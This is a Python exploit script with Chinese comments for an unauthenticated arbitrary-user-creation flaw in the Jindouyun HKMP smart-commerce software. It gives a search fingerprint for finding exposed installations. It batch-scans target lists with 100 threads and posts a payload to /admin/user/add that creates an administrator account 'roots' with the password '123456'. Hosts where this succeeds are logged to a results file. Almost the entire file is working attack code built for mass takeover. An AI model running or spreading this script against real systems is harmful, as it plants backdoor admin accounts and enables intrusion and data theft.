#金斗云 HKMP智慧商业软件 任意用户创建漏洞复现
#金斗云 HKMP智慧商业软件 /admin/useradd 接口存在任意用户创建漏洞，未经身份验证的远程攻击者可以利用此漏洞创建管理员账户从而接管系统后台，造成信息泄露，导致系统处于极不安全的状态。
#body="金斗云 Copyright" JDYHKMP_admin_useradd.py
# 导包
import requests,sys,argparse,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 校验证书错的时候防止报错
from colorama import Fore, Style
BLUE = Fore.BLUE
RESET = Style.RESET_ALL
# 指纹模块
def banner():
    banner = """

 ▄▄▄     ▄▄▄█████▓▄▄▄█████▓ ▄▄▄       ▄████▄   ██ ▄█▀    ███▄    █  ▒█████   █     █░    ▐██▌ 
▒████▄   ▓  ██▒ ▓▒▓  ██▒ ▓▒▒████▄    ▒██▀ ▀█   ██▄█▒     ██ ▀█   █ ▒██▒  ██▒▓█░ █ ░█░    ▐██▌ 
▒██  ▀█▄ ▒ ▓██░ ▒░▒ ▓██░ ▒░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░    ▓██  ▀█ ██▒▒██░  ██▒▒█░ █ ░█     ▐██▌ 
░██▄▄▄▄██░ ▓██▓ ░ ░ ▓██▓ ░ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄    ▓██▒  ▐▌██▒▒██   ██░░█░ █ ░█     ▓██▒ 
 ▓█   ▓██▒ ▒██▒ ░   ▒██▒ ░  ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄   ▒██░   ▓██░░ ████▓▒░░░██▒██▓     ▒▄▄  
 ▒▒   ▓▒█░ ▒ ░░     ▒ ░░    ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒   ░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒      ░▀▀▒ 
  ▒   ▒▒ ░   ░        ░      ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░   ░ ░░   ░ ▒░  ░ ▒ ▒░   ▒ ░ ░      ░  ░ 
  ░   ▒    ░        ░        ░   ▒   ░        ░ ░░ ░       ░   ░ ░ ░ ░ ░ ▒    ░   ░         ░ 
      ░  ░                       ░  ░░ ░      ░  ░               ░     ░ ░      ░        ░    
                                     ░                                                        
                                    author:           🐖sawa🐇
                                    version:          1.0.0
                                    For:              金斗云 HKMP智慧商业软件 任意用户创建漏洞
"""
    print(banner)
# 主函数模块
def main():
    # 先调用指纹
    banner()
    # 描述信息
    parser = argparse.ArgumentParser(description="this is a 金斗云 HKMP智慧商业软件 任意用户创建Vulnerability")
    # -u指定单个url检测， -f指定批量url进行检测
    parser.add_argument('-u','--url',dest='url',help='please input your attack-url',type=str)
    parser.add_argument('-f','--file',dest='file',help='please input your attack-url.txt',type=str)
    # 重新填写变量url，方便最后测试完成将结果写入文件内时调用
    # 调用
    args = parser.parse_args()
    # 判断输入的是单个url还是批量url，若单个不开启多线程，若多个则开启多线程
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

# poc模块
def poc(target):
    payload_url ="/admin/user/add"
    url = target+payload_url
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36",  
        'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Content-Type':'application/json;charset=UTF-8',
        'X-Requested-With':'XMLHttpRequest',
        'Accept':'application/json, text/javascript, */*; q=0.01',
        'Accept-Encoding':'gzip, deflate',
    }
    json_data = {"appId":"hkmp","mchId":"hkmp","deviceId":"hkmp","timestamp":1719305067,"nonce":5223015867,"sign":"hkmp","data":{"userCode":"roots","userName":"roots","password":"123456","privilege":["1000","8000","8010","2000","2001","2010","7000"],"adminUserCode":"admin","adminUserName":"系统管理员"}}
    try:
        res = requests.post(url=url,headers=headers,json=json_data,verify=False,timeout=5)
        # match = re.search(r'"code":"(\d+)","message":"([^"]+)"',res.text)
        if res.status_code == 200 and "用户添加成功" in res.text:#第二次跑就要改一下新增的用户名了 不然回显用户名已存在
            print(f"{BLUE}[+]该{target}存在漏洞{RESET}")
            with open ('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+"\n")
        else :
            print(f"[-]该{target}不存在漏洞")
            with open ('without-bug.txt','a',encoding='utf-8') as fp:
                fp.write(target+"\n")        
    except Exception as e:
        print(f"[*]该url存在问题{target}"+str(e))
        with open ('warning.txt','a',encoding='utf-8') as fp:
            fp.write(target+"\n")

# 主函数入口
if __name__ == "__main__":
    main()
